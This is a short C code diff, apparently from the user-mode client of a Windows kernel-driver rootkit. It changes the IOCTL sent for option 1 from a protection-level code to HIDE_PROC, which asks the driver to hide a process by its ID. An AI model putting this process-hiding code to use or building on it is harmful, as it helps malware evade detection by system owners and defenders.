@@ -93,7 +93,7 @@ wmain(
 
 	if (option == 1)
 	{
-		if (DeviceIoControl(hdevice, PROTECTION_LEVEL_ANTIMALWARE_LIGHT, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
+		if (DeviceIoControl(hdevice, HIDE_PROC, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
 			printf("IOCTL %x sent!\n", HIDE_PROC);
 		else
 		{
